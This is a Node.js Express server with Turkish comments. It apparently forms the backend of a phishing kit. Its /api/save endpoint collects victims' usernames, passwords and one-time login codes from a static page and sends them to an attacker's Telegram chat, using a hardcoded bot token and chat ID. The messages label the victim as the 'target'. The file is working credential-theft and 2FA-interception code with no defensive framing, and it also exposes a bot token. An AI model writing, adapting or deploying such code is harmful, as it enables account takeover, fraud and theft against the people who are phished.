const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Bot Bilgilerin (Burası Gizli Kalsın)
const botToken = "8776372925:AAE-IW9nG9FVHm2rw0qqAe13-aI2IC9T0lo";
const chatId = "1275533824";

app.use(bodyParser.json());
app.use(express.static('public')); // HTML dosyasını 'public' klasöründen okur

// Veriyi Telegram'a Gönderen Endpoint
app.post('/api/save', async (req, res) => {
    const { user, pass, type, code } = req.body;
    let message = "";

    if (type === 'login') {
        message = `<b>🚀 YENİ GİRİŞ!</b>\n👤 User: <code>${user}</code>\n🔑 Pass: <code>${pass}</code>`;
    } else if (type === 'otp') {
        message = `<b>📩 KOD GELDİ!</b>\n👤 Hedef: <code>${user}</code>\n🔢 Kod: <code>${code}</code>`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ status: "ok" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda aktif!`);
});